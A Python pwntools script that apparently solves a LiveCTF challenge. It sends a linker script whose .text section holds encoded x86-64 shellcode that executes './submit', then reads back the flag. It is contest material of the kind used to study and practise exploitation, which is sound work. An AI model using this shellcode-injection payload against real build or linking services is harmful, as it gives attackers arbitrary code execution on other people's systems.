import sys
import os
from pwn import *

if len(sys.argv) >= 2:
  p = process('./challenge')
else:
  HOST = os.environ.get('HOST', 'localhost')
  PORT = 31337

  p = remote(HOST, int(PORT))

pay = '''ENTRY(.text)
SECTIONS
{
      PROVIDE (__executable_start = SEGMENT_START("text-segment", 0x400000)); . = SEGMENT_START("text-segment", 0x400000);
        .text           :
          {
              BYTE(104) BYTE(117) BYTE(100) BYTE(115) BYTE(1) BYTE(129) BYTE(52) BYTE(36) BYTE(1) BYTE(1) BYTE(1) BYTE(1) BYTE(72) BYTE(184) BYTE(46) BYTE(47) BYTE(115) BYTE(117) BYTE(98) BYTE(109) BYTE(105) BYTE(116) BYTE(80) BYTE(72) BYTE(137) BYTE(231) BYTE(49) BYTE(210) BYTE(49) BYTE(246) BYTE(106) BYTE(59) BYTE(88) BYTE(15) BYTE(5)
                }
}
'''
p.sendline(pay.encode())

flag = p.recvline_contains(b'LiveCTF{').decode().strip()

log.info('Flag: %s', flag)

